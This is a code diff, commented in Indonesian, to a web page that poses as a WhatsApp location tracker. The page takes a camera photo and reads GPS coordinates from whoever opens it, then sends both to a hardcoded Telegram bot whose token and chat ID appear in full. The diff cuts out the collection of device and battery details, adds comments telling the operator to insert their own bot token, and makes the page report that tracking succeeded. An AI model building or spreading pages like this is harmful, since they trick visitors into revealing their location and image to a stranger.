@@ -92,7 +92,7 @@
       border: 2px solid #35d8ac;
     }
 
-    .device-info, .location-info, .battery-info {
+    .location-info {
       margin-top: 20px;
       background: rgba(255,255,255,0.1);
       padding: 15px;
@@ -119,8 +119,6 @@
     <button type="submit">Lacak Lokasi</button>
   </form>
   <div id="result" class="result"></div>
-  <div id="deviceInfo" class="device-info"></div>
-  <div id="batteryInfo" class="battery-info"></div>
   <div id="locationInfo" class="location-info"></div>
 </div>
 
@@ -128,27 +126,9 @@
 
 <script>
 let stream;
-const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro";
-const chatId = "5408845642";
+const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro"; // Ganti token bot elu
+const chatId = "5408845642"; // Ganti chat ID elu
 
-// Ambil informasi perangkat
-function getDeviceInfo() {
-  const deviceInfoEl = document.getElementById('deviceInfo');
-  const batteryInfoEl = document.getElementById('batteryInfo');
-
-  const device = navigator.userAgent;
-  deviceInfoEl.innerHTML = `<strong>Device Info:</strong> ${device}`;
-
-  if (navigator.getBattery) {
-    navigator.getBattery().then(function(battery) {
-      batteryInfoEl.innerHTML = `<strong>Baterai:</strong> ${battery.level * 100}% (${battery.charging ? "Sedang Mengisi" : "Tidak Mengisi"})`;
-    });
-  } else {
-    batteryInfoEl.innerHTML = "<strong>Baterai:</strong> Tidak dapat mengakses informasi baterai";
-  }
-}
-
-// Mengambil lokasi dan menambahkan ke map
 function getLocationInfo(lat, lon) {
   const locationInfoEl = document.getElementById('locationInfo');
   const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
@@ -201,7 +181,6 @@ function ambilFoto(video, tombol) {
         stream.getTracks().forEach(track => track.stop());
         document.getElementById('page1').style.display = 'none';
         document.getElementById('page2').style.display = 'block';
-        getDeviceInfo(); // Menampilkan informasi perangkat
       } else {
         alert("Gagal Kirim Foto");
       }
@@ -226,12 +205,9 @@ document.getElementById('trackForm').addEventListener('submit', async function(e
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      getLocationInfo(lat, lon); // Menampilkan info lokasi
-
-      // Link Google Maps
       const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-      
-      // Menyusun pesan yang akan dikirim
+      getLocationInfo(lat, lon);
+
       const message = `*Lacak Lokasi WhatsApp*\n\nNomor: \`${waNumber}\`\nLokasi GPS: [${lat}, ${lon}]\n\n[Lihat Lokasi di Google Maps](${mapUrl})\n\n_(Lokasi ini berdasarkan GPS pengguna)_`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -242,18 +218,9 @@ document.getElementById('trackForm').addEventListener('submit', async function(e
           text: message,
           parse_mode: "Markdown"
         })
-      })
-      .then(response => {
-        if (response.ok) {
-          resultEl.textContent = `Lokasi berhasil dilacak!\nNomor: ${waNumber}\nLokasi GPS: ${lat}, ${lon}\n[Lihat di Google Maps](${mapUrl})`;
-        } else {
-          resultEl.textContent = 'Lokasi gagal dilacak.';
-        }
-      })
-      .catch(err => {
-        resultEl.textContent = 'Terjadi kesalahan: ' + err.message;
       });
 
+      resultEl.innerHTML = `Lokasi berhasil dilacak!<br>Nomor: ${waNumber}<br>Lokasi: ${lat}, ${lon}<br><a href="${mapUrl}" target="_blank">Lihat di Google Maps</a>`;
     }, function(error) {
       resultEl.textContent = 'Gagal mendapatkan lokasi: ' + error.message;
     });
